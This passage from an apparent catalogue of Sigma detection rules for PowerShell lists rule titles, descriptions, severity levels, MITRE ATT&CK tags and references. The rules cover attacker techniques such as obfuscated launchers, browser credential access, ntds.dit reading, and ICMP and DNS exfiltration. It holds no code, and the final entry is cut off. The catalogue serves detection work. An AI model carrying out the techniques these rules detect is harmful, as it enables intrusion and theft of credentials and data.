    * Level: medium
    * MITRE: attack.execution
    * MITRE: attack.t1059.001
    
References: 
* https://github.com/SigmaHQ/sigma/tree/master/rules/windows/powershell/powershell_module/posh_pm_alternate_powershell_hosts.yml
* https://threathunterplaybook.com/notebooks/windows/02_execution/WIN-190815181010.html

    
### Zip A Folder With PowerShell For Staging In Temp
    
    Use living off the land tools to zip a file and stage it in the Windows temporary folder for later exfiltration

    * Level: medium
    * MITRE: attack.collection
    * MITRE: attack.t1074.001
    
References: 
* https://github.com/SigmaHQ/sigma/tree/master/rules/windows/powershell/powershell_module/posh_pm_susp_zip_compress.yml
* https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1074.001/T1074.001.md

    
### Remote PowerShell Session
    
    Detects remote PowerShell sessions

    * Level: high
    * MITRE: attack.execution
    * MITRE: attack.t1059.001
    * MITRE: attack.lateral_movement
    * MITRE: attack.t1021.006
    
References: 
* https://github.com/SigmaHQ/sigma/tree/master/rules/windows/powershell/powershell_module/posh_pm_remote_powershell_session.yml
* https://threathunterplaybook.com/notebooks/windows/02_execution/WIN-190511223310.html

    
### Invoke-Obfuscation CLIP+ Launcher
    
    Detects Obfuscated use of Clip.exe to execute PowerShell

    * Level: high
    * MITRE: attack.defense_evasion
    * MITRE: attack.t1027
    * MITRE: attack.execution
    * MITRE: attack.t1059.001
    
References: 
* https://github.com/SigmaHQ/sigma/tree/master/rules/windows/powershell/powershell_module/posh_pm_invoke_obfuscation_clip.yml
* https://github.com/Neo23x0/sigma/issues/1009

    
### Use Get-NetTCPConnection
    
    Adversaries may attempt to get a listing of network connections to or from the compromised system they are currently accessing or from remote systems by querying for information over the network.

    * Level: low
    * MITRE: attack.discovery
    * MITRE: attack.t1049
    
References: 
* https://github.com/SigmaHQ/sigma/tree/master/rules/windows/powershell/powershell_module/posh_pm_susp_get_nettcpconnection.yml
* https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1049/T1049.md#atomic-test-2---system-network-connections-discovery-with-powershell

    
### Invoke-Obfuscation RUNDLL LAUNCHER
    
    Detects Obfuscated Powershell via RUNDLL LAUNCHER

    * Level: medium
    * MITRE: attack.defense_evasion
    * MITRE: attack.t1027
    * MITRE: attack.execution
    * MITRE: attack.t1059.001
    
References: 
* https://github.com/SigmaHQ/sigma/tree/master/rules/windows/powershell/powershell_module/posh_pm_invoke_obfuscation_via_rundll.yml
* https://github.com/Neo23x0/sigma/issues/1009

    
### Invoke-Obfuscation Via Use Clip
    
    Detects Obfuscated Powershell via use Clip.exe in Scripts

    * Level: high
    * MITRE: attack.defense_evasion
    * MITRE: attack.t1027
    * MITRE: attack.execution
    * MITRE: attack.t1059.001
    
References: 
* https://github.com/SigmaHQ/sigma/tree/master/rules/windows/powershell/powershell_module/posh_pm_invoke_obfuscation_via_use_clip.yml
* https://github.com/Neo23x0/sigma/issues/1009

    
### Invoke-Obfuscation Via Use MSHTA
    
    Detects Obfuscated Powershell via use MSHTA in Scripts

    * Level: high
    * MITRE: attack.defense_evasion
    * MITRE: attack.t1027
    * MITRE: attack.execution
    * MITRE: attack.t1059.001
    
References: 
* https://github.com/SigmaHQ/sigma/tree/master/rules/windows/powershell/powershell_module/posh_pm_invoke_obfuscation_via_use_mhsta.yml
* https://github.com/Neo23x0/sigma/issues/1009

    
### Clear PowerShell History
    
    Detects keywords that could indicate clearing PowerShell history

    * Level: medium
    * MITRE: attack.defense_evasion
    * MITRE: attack.t1070.003
    
References: 
* https://github.com/SigmaHQ/sigma/tree/master/rules/windows/powershell/powershell_module/posh_pm_clear_powershell_history.yml
* https://gist.github.com/hook-s3c/7363a856c3cdbadeb71085147f042c1a

    
### Invoke-Obfuscation COMPRESS OBFUSCATION
    
    Detects Obfuscated Powershell via COMPRESS OBFUSCATION

    * Level: medium
    * MITRE: attack.defense_evasion
    * MITRE: attack.t1027
    * MITRE: attack.execution
    * MITRE: attack.t1059.001
    
References: 
* https://github.com/SigmaHQ/sigma/tree/master/rules/windows/powershell/powershell_module/posh_pm_invoke_obfuscation_via_compress.yml
* https://github.com/Neo23x0/sigma/issues/1009

    
### Suspicious Get Information for SMB Share
    
    Adversaries may look for folders and drives shared on remote systems as a means of identifying sources of information to gather as a precursor for Collection and
to identify potential systems of interest for Lateral Movement.
Networks often contain shared network drives and folders that enable users to access file directories on various systems across a network. 


    * Level: low
    * MITRE: attack.discovery
    * MITRE: attack.t1069.001
    
References: 
* https://github.com/SigmaHQ/sigma/tree/master/rules/windows/powershell/powershell_module/posh_pm_susp_smb_share_reco.yml
* https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1069.002/T1069.002.md

    
### Invoke-Obfuscation Obfuscated IEX Invocation
    
    Detects all variations of obfuscated powershell IEX invocation code generated by Invoke-Obfuscation framework from the following code block \u2014

    * Level: high
    * MITRE: attack.defense_evasion
    * MITRE: attack.t1027
    * MITRE: attack.execution
    * MITRE: attack.t1059.001
    
References: 
* https://github.com/SigmaHQ/sigma/tree/master/rules/windows/powershell/powershell_module/posh_pm_invoke_obfuscation_obfuscated_iex.yml
* https://github.com/danielbohannon/Invoke-Obfuscation/blob/master/Out-ObfuscatedStringCommand.ps1#L873-L888

    
### Invoke-Obfuscation Via Use Rundll32
    
    Detects Obfuscated Powershell via use Rundll32 in Scripts

    * Level: high
    * MITRE: attack.defense_evasion
    * MITRE: attack.t1027
    * MITRE: attack.execution
    * MITRE: attack.t1059.001
    
References: 
* https://github.com/SigmaHQ/sigma/tree/master/rules/windows/powershell/powershell_module/posh_pm_invoke_obfuscation_via_use_rundll32.yml
* https://github.com/Neo23x0/sigma/issues/1009

    
### Suspicious PowerShell Invocations - Specific
    
    Detects suspicious PowerShell invocation command parameters

    * Level: high
    * MITRE: attack.execution
    * MITRE: attack.t1059.001
    
References: 
* https://github.com/SigmaHQ/sigma/tree/master/rules/windows/powershell/powershell_module/posh_pm_susp_invocation_specific.yml
    
### Suspicious Get Local Groups Information
    
    Adversaries may attempt to find local system groups and permission settings.
The knowledge of local system permission groups can help adversaries determine which groups exist and which users belong to a particular group.
Adversaries may use this information to determine which users have elevated permissions, such as the users found within the local administrators group. 


    * Level: low
    * MITRE: attack.discovery
    * MITRE: attack.t1069.001
    
References: 
* https://github.com/SigmaHQ/sigma/tree/master/rules/windows/powershell/powershell_module/posh_pm_susp_local_group_reco.yml
* https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1069.001/T1069.001.md

    
### Invoke-Obfuscation VAR++ LAUNCHER OBFUSCATION
    
    Detects Obfuscated Powershell via VAR++ LAUNCHER

    * Level: high
    * MITRE: attack.defense_evasion
    * MITRE: attack.t1027
    * MITRE: attack.execution
    * MITRE: attack.t1059.001
    
References: 
* https://github.com/SigmaHQ/sigma/tree/master/rules/windows/powershell/powershell_module/posh_pm_invoke_obfuscation_via_var.yml
* https://github.com/Neo23x0/sigma/issues/1009

    
### Invoke-Obfuscation VAR+ Launcher
    
    Detects Obfuscated use of Environment Variables to execute PowerShell

    * Level: high
    * MITRE: attack.defense_evasion
    * MITRE: attack.t1027
    * MITRE: attack.execution
    * MITRE: attack.t1059.001
    
References: 
* https://github.com/SigmaHQ/sigma/tree/master/rules/windows/powershell/powershell_module/posh_pm_invoke_obfuscation_var.yml
* https://github.com/Neo23x0/sigma/issues/1009

    
### Bad Opsec Powershell Code Artifacts
    
    Focuses on trivial artifacts observed in variants of prevalent offensive ps1 payloads, including Cobalt Strike Beacon, PoshC2, Powerview, Letmein, Empire, Powersploit, and other attack payloads that often undergo minimal changes by attackers due to bad opsec.

    * Level: critical
    * MITRE: attack.execution
    * MITRE: attack.t1059.001
    
References: 
* https://github.com/SigmaHQ/sigma/tree/master/rules/windows/powershell/powershell_module/posh_pm_bad_opsec_artifacts.yml
* https://newtonpaul.com/analysing-fileless-malware-cobalt-strike-beacon/

* https://labs.sentinelone.com/top-tier-russian-organized-cybercrime-group-unveils-fileless-stealthy-powertrick-backdoor-for-high-value-targets/

* https://www.mdeditor.tw/pl/pgRt

    
### Netcat The Powershell Version
    
    Adversaries may use a non-application layer protocol for communication between host and C2 server or among infected hosts within a network

    * Level: medium
    * MITRE: attack.command_and_control
    * MITRE: attack.t1095
    
References: 
* https://github.com/SigmaHQ/sigma/tree/master/rules/windows/powershell/powershell_module/posh_pm_powercat.yml
* https://nmap.org/ncat/

* https://github.com/besimorhino/powercat

* https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1095/T1095.md

    
### Suspicious Computer Machine Password by PowerShell
    
    The Reset-ComputerMachinePassword cmdlet changes the computer account password that the computers use to authenticate to the domain controllers in the domain. You can use it to reset the password of the local computer.

    * Level: medium
    * MITRE: attack.initial_access
    * MITRE: attack.t1078
    
References: 
* https://github.com/SigmaHQ/sigma/tree/master/rules/windows/powershell/powershell_module/posh_pm_susp_reset_computermachinepassword.yml
* https://docs.microsoft.com/en-us/powershell/module/microsoft.powershell.management/reset-computermachinepassword?view=powershell-5.1

* https://thedfirreport.com/2022/02/21/qbot-and-zerologon-lead-to-full-domain-compromise/

    
### SyncAppvPublishingServer Execution to Bypass Powershell Restriction
    
    Detects SyncAppvPublishingServer process execution which usually utilized by adversaries to bypass PowerShell execution restrictions.

    * Level: medium
    * MITRE: attack.defense_evasion
    * MITRE: attack.t1218
    
References: 
* https://github.com/SigmaHQ/sigma/tree/master/rules/windows/powershell/powershell_module/posh_pm_syncappvpublishingserver_exe.yml
* https://lolbas-project.github.io/lolbas/Binaries/Syncappvpublishingserver/

    
### Suspicious PowerShell Invocations - Generic
    
    Detects suspicious PowerShell invocation command parameters

    * Level: high
    * MITRE: attack.execution
    * MITRE: attack.t1059.001
    
References: 
* https://github.com/SigmaHQ/sigma/tree/master/rules/windows/powershell/powershell_module/posh_pm_susp_invocation_generic.yml
    
### Abusable Invoke-ATHRemoteFXvGPUDisablementCommand
    
    RemoteFXvGPUDisablement.exe is an abusable, signed PowerShell host executable that was introduced in Windows 10 and Server 2019 (OS Build 17763.1339).

    * Level: medium
    * MITRE: attack.defense_evasion
    * MITRE: attack.t1218
    
References: 
* https://github.com/SigmaHQ/sigma/tree/master/rules/windows/powershell/powershell_module/posh_pm_susp_athremotefxvgpudisablementcommand.yml
* https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1218/T1218.md

* https://github.com/redcanaryco/AtomicTestHarnesses/blob/master/TestHarnesses/T1218_SignedBinaryProxyExecution/InvokeRemoteFXvGPUDisablementCommand.ps1

    
### PowerShell Get Clipboard
    
    A General detection for the Get-Clipboard commands in PowerShell logs. This could be an adversary capturing clipboard contents.

    * Level: medium
    * MITRE: attack.collection
    * MITRE: attack.t1115
    
References: 
* https://github.com/SigmaHQ/sigma/tree/master/rules/windows/powershell/powershell_module/posh_pm_get_clipboard.yml
* https://github.com/OTRF/detection-hackathon-apt29/issues/16

* https://threathunterplaybook.com/evals/apt29/detections/7.A.2_F4609F7E-C4DB-4327-91D4-59A58C962A02.html

    
### Invoke-Obfuscation Via Stdin
    
    Detects Obfuscated Powershell via Stdin in Scripts

    * Level: high
    * MITRE: attack.defense_evasion
    * MITRE: attack.t1027
    * MITRE: attack.execution
    * MITRE: attack.t1059.001
    
References: 
* https://github.com/SigmaHQ/sigma/tree/master/rules/windows/powershell/powershell_module/posh_pm_invoke_obfuscation_via_stdin.yml
* https://github.com/Neo23x0/sigma/issues/1009

    
### Suspicious PowerShell Download
    
    Detects suspicious PowerShell download command

    * Level: medium
    * MITRE: attack.execution
    * MITRE: attack.t1059.001
    
References: 
* https://github.com/SigmaHQ/sigma/tree/master/rules/windows/powershell/powershell_module/posh_pm_susp_download.yml
    
### PowerShell Decompress Commands
    
    A General detection for specific decompress commands in PowerShell logs. This could be an adversary decompressing files.

    * Level: informational
    * MITRE: attack.defense_evasion
    * MITRE: attack.t1140
    
References: 
* https://github.com/SigmaHQ/sigma/tree/master/rules/windows/powershell/powershell_module/posh_pm_decompress_commands.yml
* https://github.com/OTRF/detection-hackathon-apt29/issues/8

* https://threathunterplaybook.com/evals/apt29/detections/4.A.3_09F29912-8E93-461E-9E89-3F06F6763383.html

    
### Invoke-Obfuscation STDIN+ Launcher
    
    Detects Obfuscated use of stdin to execute PowerShell

    * Level: high
    * MITRE: attack.defense_evasion
    * MITRE: attack.t1027
    * MITRE: attack.execution
    * MITRE: attack.t1059.001
    
References: 
* https://github.com/SigmaHQ/sigma/tree/master/rules/windows/powershell/powershell_module/posh_pm_invoke_obfuscation_stdin.yml
* https://github.com/Neo23x0/sigma/issues/1009

    
### Suspicious Get-ADDBAccount Usage
    
    Detects suspicious invocation of the Get-ADDBAccount script that reads from a ntds.dit file and may be used to get access to credentials without using any credential dumpers

    * Level: high
    * MITRE: attack.credential_access
    * MITRE: attack.t1003.003
    
References: 
* https://github.com/SigmaHQ/sigma/tree/master/rules/windows/powershell/powershell_module/posh_pm_get_addbaccount.yml
* https://www.n00py.io/2022/03/manipulating-user-passwords-without-mimikatz/

* https://github.com/MichaelGrafnetter/DSInternals/blob/7ba59c12ee9a1cb430d7dc186a3366842dd612c8/Documentation/PowerShell/Get-ADDBAccount.md

    
### Suspicious Get Information for AD Groups or DoesNotRequirePreAuth User
    
    Adversaries may attempt to find domain-level groups and permission settings.
The knowledge of domain-level permission groups can help adversaries determine which groups exist and which users belong to a particular group.
Adversaries may use this information to determine which users have elevated permissions, such as domain administrators. 


    * Level: low
    * MITRE: attack.discovery
    * MITRE: attack.t1069.001
    
References: 
* https://github.com/SigmaHQ/sigma/tree/master/rules/windows/powershell/powershell_module/posh_pm_susp_ad_group_reco.yml
* https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1069.002/T1069.002.md

    
### Malicious PowerShell Keywords
    
    Detects keywords from well-known PowerShell exploitation frameworks

    * Level: high
    * MITRE: attack.execution
    * MITRE: attack.t1059.001
    
References: 
* https://github.com/SigmaHQ/sigma/tree/master/rules/windows/powershell/powershell_script/posh_ps_malicious_keywords.yml
* https://adsecurity.org/?p=2921

    
### Testing Usage of Uncommonly Used Port
    
    Adversaries may communicate using a protocol and port paring that are typically not associated.
For example, HTTPS over port 8088(Citation: Symantec Elfin Mar 2019) or port 587(Citation: Fortinet Agent Tesla April 2018) as opposed to the traditional port 443. 


    * Level: medium
    * MITRE: attack.command_and_control
    * MITRE: attack.t1571
    
References: 
* https://github.com/SigmaHQ/sigma/tree/master/rules/windows/powershell/powershell_script/posh_ps_test_netconnection.yml
* https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1571/T1571.md#atomic-test-1---testing-usage-of-uncommonly-used-port-with-powershell

* https://docs.microsoft.com/en-us/powershell/module/nettcpip/test-netconnection?view=windowsserver2022-ps

    
### Windows PowerShell Web Request
    
    Detects the use of various web request methods (including aliases) via Windows PowerShell command

    * Level: medium
    * MITRE: attack.execution
    * MITRE: attack.t1059.001
    
References: 
* https://github.com/SigmaHQ/sigma/tree/master/rules/windows/powershell/powershell_script/posh_ps_web_request.yml
* https://4sysops.com/archives/use-powershell-to-download-a-file-with-http-https-and-ftp/

* https://blog.jourdant.me/post/3-ways-to-download-files-with-powershell

    
### Service Registry Permissions Weakness Check
    
    Adversaries may execute their own malicious payloads by hijacking the Registry entries used by services.
Adversaries may use flaws in the permissions for registry to redirect from the originally specified executable to one that they control, in order to launch their own code at Service start.
Windows stores local service configuration information in the Registry under HKLM\SYSTEM\CurrentControlSet\Services


    * Level: medium
    * MITRE: attack.persistence
    * MITRE: attack.t1574.011
    
References: 
* https://github.com/SigmaHQ/sigma/tree/master/rules/windows/powershell/powershell_script/posh_ps_get_acl_service.yml
* https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1574.011/T1574.011.md#atomic-test-1---service-registry-permissions-weakness

* https://docs.microsoft.com/en-us/powershell/module/microsoft.powershell.security/get-acl?view=powershell-7.2

    
### Suspicious Get Information for AD Groups or DoesNotRequirePreAuth User
    
    Adversaries may attempt to find domain-level groups and permission settings.
The knowledge of domain-level permission groups can help adversaries determine which groups exist and which users belong to a particular group.
Adversaries may use this information to determine which users have elevated permissions, such as domain administrators. 


    * Level: low
    * MITRE: attack.discovery
    * MITRE: attack.t1069.001
    
References: 
* https://github.com/SigmaHQ/sigma/tree/master/rules/windows/powershell/powershell_script/posh_ps_susp_ad_group_reco.yml
* https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1069.002/T1069.002.md

    
### Data Compressed - PowerShell
    
    An adversary may compress data (e.g., sensitive documents) that is collected prior to exfiltration in order to make it portable and minimize the amount of data sent over the network.

    * Level: low
    * MITRE: attack.exfiltration
    * MITRE: attack.t1560
    
References: 
* https://github.com/SigmaHQ/sigma/tree/master/rules/windows/powershell/powershell_script/posh_ps_data_compressed.yml
* https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1560/T1560.md

    
### WMImplant Hack Tool
    
    Detects parameters used by WMImplant

    * Level: high
    * MITRE: attack.execution
    * MITRE: attack.t1047
    * MITRE: attack.t1059.001
    
References: 
* https://github.com/SigmaHQ/sigma/tree/master/rules/windows/powershell/powershell_script/posh_ps_wmimplant.yml
* https://github.com/FortyNorthSecurity/WMImplant

    
### Change PowerShell Policies to an Unsecure Level
    
    Detects use of Set-ExecutionPolicy to set a unsecure policies

    * Level: medium
    * MITRE: attack.execution
    * MITRE: attack.t1059.001
    
References: 
* https://github.com/SigmaHQ/sigma/tree/master/rules/windows/powershell/powershell_script/posh_ps_set_policies_to_unsecure_level.yml
* https://docs.microsoft.com/en-us/powershell/module/microsoft.powershell.security/set-executionpolicy?view=powershell-7.1

* https://docs.microsoft.com/en-us/powershell/module/microsoft.powershell.core/about/about_execution_policies?view=powershell-7.1

* https://adsecurity.org/?p=2604

    
### Suspicious PowerShell Keywords
    
    Detects keywords that could indicate the use of some PowerShell exploitation framework

    * Level: high
    * MITRE: attack.execution
    * MITRE: attack.t1059.001
    
References: 
* https://github.com/SigmaHQ/sigma/tree/master/rules/windows/powershell/powershell_script/posh_ps_susp_keywords.yml
* https://posts.specterops.io/entering-a-covenant-net-command-and-control-e11038bcf462

* https://github.com/PowerShellMafia/PowerSploit/blob/master/CodeExecution/Invoke-ReflectivePEInjection.ps1

* https://github.com/hlldz/Invoke-Phant0m/blob/master/Invoke-Phant0m.ps1

* https://gist.github.com/MHaggis/0dbe00ad401daa7137c81c99c268cfb7

    
### Powershell Execute Batch Script
    
    Adversaries may abuse the Windows command shell for execution.
The Windows command shell ([cmd](https://attack.mitre.org/software/S0106)) is the primary command prompt on Windows systems.
The Windows command prompt can be used to control almost any aspect of a system, with various permission levels required for different subsets of commands.
Batch files (ex: .bat or .cmd) also provide the shell with a list of sequential commands to run, as well as normal scripting operations such as conditionals and loops.
Common uses of batch files include long or repetitive tasks, or the need to run the same set of commands on multiple system


    * Level: medium
    * MITRE: attack.execution
    * MITRE: attack.t1059.003
    
References: 
* https://github.com/SigmaHQ/sigma/tree/master/rules/windows/powershell/powershell_script/posh_ps_susp_execute_batch_script.yml
* https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1059.003/T1059.003.md#atomic-test-1---create-and-execute-batch-script

    
### Suspicious IO.FileStream
    
    Open a handle on the drive volume via the \\.\ DOS device path specifier and perform direct access read of the first few bytes of the volume.

    * Level: medium
    * MITRE: attack.defense_evasion
    * MITRE: attack.t1070.003
    
References: 
* https://github.com/SigmaHQ/sigma/tree/master/rules/windows/powershell/powershell_script/posh_ps_susp_iofilestream.yml
* https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1006/T1006.md

    
### PowerShell Remote Session Creation
    
    Adversaries may abuse PowerShell commands and scripts for execution.
PowerShell is a powerful interactive command-line interface and scripting environment included in the Windows operating system


    * Level: medium
    * MITRE: attack.execution
    * MITRE: attack.t1059.001
    
References: 
* https://github.com/SigmaHQ/sigma/tree/master/rules/windows/powershell/powershell_script/posh_ps_remote_session_creation.yml
* https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1059.001/T1059.001.md#atomic-test-10---powershell-invoke-downloadcradle

* https://docs.microsoft.com/en-us/powershell/module/microsoft.powershell.core/new-pssession?view=powershell-7.2

    
### Accessing WinAPI in PowerShell
    
    Detecting use WinAPI Functions in PowerShell

    * Level: high
    * MITRE: attack.execution
    * MITRE: attack.t1059.001
    * MITRE: attack.t1106
    
References: 
* https://github.com/SigmaHQ/sigma/tree/master/rules/windows/powershell/powershell_script/posh_ps_accessing_win_api.yml
* https://speakerdeck.com/heirhabarov/hunting-for-powershell-abuse

    
### Invoke-Obfuscation Obfuscated IEX Invocation
    
    Detects all variations of obfuscated powershell IEX invocation code generated by Invoke-Obfuscation framework from the following code block \u2014

    * Level: high
    * MITRE: attack.defense_evasion
    * MITRE: attack.t1027
    * MITRE: attack.execution
    * MITRE: attack.t1059.001
    
References: 
* https://github.com/SigmaHQ/sigma/tree/master/rules/windows/powershell/powershell_script/posh_ps_invoke_obfuscation_obfuscated_iex.yml
* https://github.com/danielbohannon/Invoke-Obfuscation/blob/master/Out-ObfuscatedStringCommand.ps1#L873-L888

    
### PowerShell Deleted Mounted Share
    
    Detects when when a mounted share is removed. Adversaries may remove share connections that are no longer useful in order to clean up traces of their operation

    * Level: medium
    * MITRE: attack.defense_evasion
    * MITRE: attack.t1070.005
    
References: 
* https://github.com/SigmaHQ/sigma/tree/master/rules/windows/powershell/powershell_script/posh_ps_susp_mounted_share_deletion.yml
* https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1070.005/T1070.005.md

    
### Automated Collection Command PowerShell
    
    Once established within a system or network, an adversary may use automated techniques for collecting internal data.

    * Level: medium
    * MITRE: attack.collection
    * MITRE: attack.t1119
    
References: 
* https://github.com/SigmaHQ/sigma/tree/master/rules/windows/powershell/powershell_script/posh_ps_automated_collection.yml
* https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1119/T1119.md

    
### Invoke-Obfuscation CLIP+ Launcher
    
    Detects Obfuscated use of Clip.exe to execute PowerShell

    * Level: high
    * MITRE: attack.defense_evasion
    * MITRE: attack.t1027
    * MITRE: attack.execution
    * MITRE: attack.t1059.001
    
References: 
* https://github.com/SigmaHQ/sigma/tree/master/rules/windows/powershell/powershell_script/posh_ps_invoke_obfuscation_clip.yml
* https://github.com/Neo23x0/sigma/issues/1009

    
### Zip A Folder With PowerShell For Staging In Temp
    
    Use living off the land tools to zip a file and stage it in the Windows temporary folder for later exfiltration

    * Level: medium
    * MITRE: attack.collection
    * MITRE: attack.t1074.001
    
References: 
* https://github.com/SigmaHQ/sigma/tree/master/rules/windows/powershell/powershell_script/posh_ps_susp_zip_compress.yml
* https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1074.001/T1074.001.md

    
### Invoke-Obfuscation STDIN+ Launcher
    
    Detects Obfuscated use of stdin to execute PowerShell

    * Level: high
    * MITRE: attack.defense_evasion
    * MITRE: attack.t1027
    * MITRE: attack.execution
    * MITRE: attack.t1059.001
    
References: 
* https://github.com/SigmaHQ/sigma/tree/master/rules/windows/powershell/powershell_script/posh_ps_invoke_obfuscation_stdin.yml
* https://github.com/Neo23x0/sigma/issues/1009

    
### Powershell Create Scheduled Task
    
    Adversaries may abuse the Windows Task Scheduler to perform task scheduling for initial or recurring execution of malicious code

    * Level: medium
    * MITRE: attack.persistence
    * MITRE: attack.t1053.005
    
References: 
* https://github.com/SigmaHQ/sigma/tree/master/rules/windows/powershell/powershell_script/posh_ps_cmdlet_scheduled_task.yml
* https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1053.005/T1053.005.md#atomic-test-4---powershell-cmdlet-scheduled-task

* https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1053.005/T1053.005.md#atomic-test-6---wmi-invoke-cimmethod-scheduled-task

    
### Replace Desktop Wallpaper by Powershell
    
    An adversary may deface systems internal to an organization in an attempt to intimidate or mislead users.
This may take the form of modifications to internal websites, or directly to user systems with the replacement of the desktop wallpaper


    * Level: low
    * MITRE: attack.impact
    * MITRE: attack.t1491.001
    
References: 
* https://github.com/SigmaHQ/sigma/tree/master/rules/windows/powershell/powershell_script/posh_ps_susp_wallpaper.yml
* https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1491.001/T1491.001.md

    
### Windows Screen Capture with CopyFromScreen
    
    Adversaries may attempt to take screen captures of the desktop to gather information over the course of an operation.
Screen capturing functionality may be included as a feature of a remote access tool used in post-compromise operations


    * Level: medium
    * MITRE: attack.collection
    * MITRE: attack.t1113
    
References: 
* https://github.com/SigmaHQ/sigma/tree/master/rules/windows/powershell/powershell_script/posh_ps_capture_screenshots.yml
* https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1113/T1113.md#atomic-test-6---windows-screen-capture-copyfromscreen

    
### Invoke-Obfuscation VAR+ Launcher
    
    Detects Obfuscated use of Environment Variables to execute PowerShell

    * Level: high
    * MITRE: attack.defense_evasion
    * MITRE: attack.t1027
    * MITRE: attack.execution
    * MITRE: attack.t1059.001
    
References: 
* https://github.com/SigmaHQ/sigma/tree/master/rules/windows/powershell/powershell_script/posh_ps_invoke_obfuscation_var.yml
* https://github.com/Neo23x0/sigma/issues/1009

    
### Powershell File and Directory Discovery
    
    Adversaries may enumerate files and directories or may search in specific locations of a host or network share for certain information within a file system.
Adversaries may use the information from [File and Directory Discovery](https://attack.mitre.org/techniques/T1083) during automated discovery to shape follow-on behaviors,
including whether or not the adversary fully infects the target and/or attempts specific actions. 


    * Level: low
    * MITRE: attack.discovery
    * MITRE: attack.t1083
    
References: 
* https://github.com/SigmaHQ/sigma/tree/master/rules/windows/powershell/powershell_script/posh_ps_file_and_directory_discovery.yml
* https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1083/T1083.md

    
### Invoke-Obfuscation VAR++ LAUNCHER OBFUSCATION
    
    Detects Obfuscated Powershell via VAR++ LAUNCHER

    * Level: high
    * MITRE: attack.defense_evasion
    * MITRE: attack.t1027
    * MITRE: attack.execution
    * MITRE: attack.t1059.001
    
References: 
* https://github.com/SigmaHQ/sigma/tree/master/rules/windows/powershell/powershell_script/posh_ps_invoke_obfuscation_via_var.yml
* https://github.com/Neo23x0/sigma/issues/1009

    
### Powershell Trigger Profiles by Add_Content
    
    Adversaries may gain persistence and elevate privileges by executing malicious content triggered by PowerShell profiles.

    * Level: medium
    * MITRE: attack.privilege_escalation
    * MITRE: attack.t1546.013
    
References: 
* https://github.com/SigmaHQ/sigma/tree/master/rules/windows/powershell/powershell_script/posh_ps_trigger_profiles.yml
* https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1546.013/T1546.013.md

    
### Suspicious Get Local Groups Information
    
    Adversaries may attempt to find local system groups and permission settings.
The knowledge of local system permission groups can help adversaries determine which groups exist and which users belong to a particular group.
Adversaries may use this information to determine which users have elevated permissions, such as the users found within the local administrators group.


    * Level: low
    * MITRE: attack.discovery
    * MITRE: attack.t1069.001
    
References: 
* https://github.com/SigmaHQ/sigma/tree/master/rules/windows/powershell/powershell_script/posh_ps_susp_local_group_reco.yml
* https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1069.001/T1069.001.md

    
### Access to Browser Login Data
    
    Adversaries may acquire credentials from web browsers by reading files specific to the target browser.
Web browsers commonly save credentials such as website usernames and passwords so that they do not need to be entered manually in the future.
Web browsers typically store the credentials in an encrypted format within a credential store.


    * Level: medium
    * MITRE: attack.credential_access
    * MITRE: attack.t1555.003
    
References: 
* https://github.com/SigmaHQ/sigma/tree/master/rules/windows/powershell/powershell_script/posh_ps_access_to_browser_login_data.yml
* https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1555.003/T1555.003.md

    
### Suspicious Connection to Remote Account
    
    Adversaries with no prior knowledge of legitimate credentials within the system or environment may guess passwords to attempt access to accounts.
Without knowledge of the password for an account, an adversary may opt to systematically guess the password using a repetitive or iterative mechanism


    * Level: low
    * MITRE: attack.credential_access
    * MITRE: attack.t1110.001
    
References: 
* https://github.com/SigmaHQ/sigma/tree/master/rules/windows/powershell/powershell_script/posh_ps_susp_networkcredential.yml
* https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1110.001/T1110.001.md#atomic-test-2---brute-force-credentials-of-single-active-directory-domain-user-via-ldap-against-domain-controller-ntlm-or-kerberos

    
### PowerShell ICMP Exfiltration
    
    Detects Exfiltration Over Alternative Protocol - ICMP. Adversaries may steal data by exfiltrating it over an un-encrypted network protocol other than that of the existing command and control channel.

    * Level: medium
    * MITRE: attack.exfiltration
    * MITRE: attack.t1048.003
    
References: 
* https://github.com/SigmaHQ/sigma/tree/master/rules/windows/powershell/powershell_script/posh_ps_icmp_exfiltration.yml
* https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1048.003/T1048.003.md#atomic-test-2---exfiltration-over-alternative-protocol---icmp

    
### Powershell Suspicious Win32_PnPEntity
    
    Adversaries may attempt to gather information about attached peripheral devices and components connected to a computer system.

    * Level: low
    * MITRE: attack.discovery
    * MITRE: attack.t1120
    
References: 
* https://github.com/SigmaHQ/sigma/tree/master/rules/windows/powershell/powershell_script/posh_ps_susp_win32_pnpentity.yml
* https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1120/T1120.md

    
### Recon Information for Export with PowerShell
    
    Once established within a system or network, an adversary may use automated techniques for collecting internal data

    * Level: medium
    * MITRE: attack.collection
    * MITRE: attack.t1119
    
References: 
* https://github.com/SigmaHQ/sigma/tree/master/rules/windows/powershell/powershell_script/posh_ps_susp_recon.yml
* https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1119/T1119.md

    
### Powershell DNSExfiltration
    
    DNSExfiltrator allows for transfering (exfiltrate) a file over a DNS request covert channel

    * Level: high
    * MITRE: attack.exfiltration
    * MITRE: attack.t1048
    
References: 
